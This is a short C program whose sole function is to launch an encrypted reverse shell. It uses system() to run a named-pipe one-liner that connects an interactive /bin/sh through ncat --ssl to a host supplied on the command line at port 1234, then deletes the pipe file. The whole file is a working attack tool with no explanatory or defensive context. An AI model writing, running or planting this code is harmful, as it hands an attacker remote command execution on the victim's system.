#include <stdio.h>
#include <stdlib.h>

#define REMOTE_PORT 1234

int main(int argc, char *argv[])
{
    char command[100];

    snprintf(command, 100, "rm /tmp/f;/usr/bin/mkfifo /tmp/f;cat /tmp/f| /bin/sh -i 2>&1 | ncat --ssl %s 1234 >/tmp/f", argv[1]);

    system(command);
    system("rm -f /tmp/f");
    return 0;
}
